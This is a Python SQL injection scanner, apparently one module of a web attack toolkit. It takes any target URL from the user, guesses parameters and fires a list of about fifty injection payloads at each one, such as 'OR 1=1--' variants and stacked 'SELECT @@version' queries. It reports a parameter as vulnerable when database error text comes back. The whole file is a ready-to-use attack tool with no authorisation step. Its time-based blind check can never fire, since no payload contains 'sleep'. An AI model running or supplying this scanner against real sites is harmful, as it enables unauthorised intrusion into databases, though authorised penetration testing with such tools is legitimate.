import requests
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from colorama import Fore, init

init(autoreset=True)  # Automatically reset color after each print

def guess_params(params):
    if not params:
        common_params = ['id', 'page', 'user', 'search', 'q']
        params = {p: [''] for p in common_params}
    return params

def run():
    print("Running SQL Injection scan with automatic parameter detection...")
    url = input("Enter target URL (with or without parameters): ").strip()
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    params = guess_params(params)

    payloads = [
        "'",
        "%27",
        '"',
        "' OR '1'='1",
        '" OR "1"="1',
        "';--",
        "' OR 1=1 --",
        "' OR 'a'='a",
        "nu11secur1ty' or 1=1#",
        "'",
        " or 1=1",
        "' or 1=1",
        " or 1=1",
        " or 1=1--",
        "' or 1=1--",
        " or 1=1--",
        " or 1=1-- -",
        "' or 1=1-- -",
        " or 1=1-- -",
        "' or 'x'='x",
        ' or "x"="x',
        "') or 1=1--",
        " ) or 1=1--",
        "') or 1=1-- -",
        ") or 1=1-- -",
        "') or ('x')=('x",
        ') or ("x")=("x',
        " or true",
        "' or true",
        " or true",
        "'''' or true--",
        "' or true--",
        " or true--",
        " or true-- -",
        "' or true-- -",
        " or true-- -",
        "))",
        "'))",
        "))",
        "))--",
        "'))--",
        "'''))--",
        "))-- -",
        "'))-- -",
        "))-- -",
        ";SELECT version()",
        ";SELECT @@version",
        ";SELECT version();",
        ";SELECT @@version;",
        ";SELECT version();--",
        ";SELECT @@version;--"
    ]

    error_signatures = [
        "you have an error in your sql syntax",
        "warning: mysql",
        "unclosed quotation mark",
        "quoted string not properly terminated",
        "sqlstate",
        "syntax error",
        "fatal error"
    ]

    vulnerable_params = []

    for param in params:
        print(Fore.CYAN + f"[+] Testing parameter: {param}")
        vulnerable = False
        for payload in payloads:
            test_params = params.copy()
            test_params[param] = payload
            test_url = urlunparse(parsed._replace(query=urlencode(test_params, doseq=True)))
            try:
                start = time.time()
                res = requests.get(test_url, timeout=10)
                elapsed = time.time() - start
                content_lower = res.text.lower()

                if any(err in content_lower for err in error_signatures):
                    print(Fore.RED + f"[!] SQL Injection vulnerability detected in parameter: {param} with payload: {payload}")
                    vulnerable = True
                    vulnerable_params.append(param)
                    break
                elif elapsed > 5 and "sleep" in payload.lower():
                    print(Fore.RED + f"[!] Possible Blind SQL Injection (delay) in parameter: {param} with payload: {payload}")
                    vulnerable = True
                    vulnerable_params.append(param)
                    break

            except Exception as e:
                print(Fore.RED + f"[ERROR] {e}")

        if not vulnerable:
            print(Fore.YELLOW + f"[ ] No SQL Injection detected in parameter: {param}")

    if not vulnerable_params:
        print(Fore.YELLOW + "[!] No vulnerable parameters detected for SQL Injection.")
